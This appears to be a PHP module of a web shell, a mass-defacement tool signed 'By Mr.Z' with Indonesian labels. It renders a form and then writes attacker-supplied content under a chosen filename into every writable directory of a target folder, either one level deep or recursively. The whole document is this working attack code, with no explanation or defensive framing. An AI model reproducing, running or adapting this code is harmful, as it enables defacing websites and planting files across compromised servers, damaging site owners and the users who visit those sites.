<?php
if($_GET['to'] == 'mass') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='ini.html' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>By Mr.Z</textarea><br>
	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
	</form></center>";
	} 
	}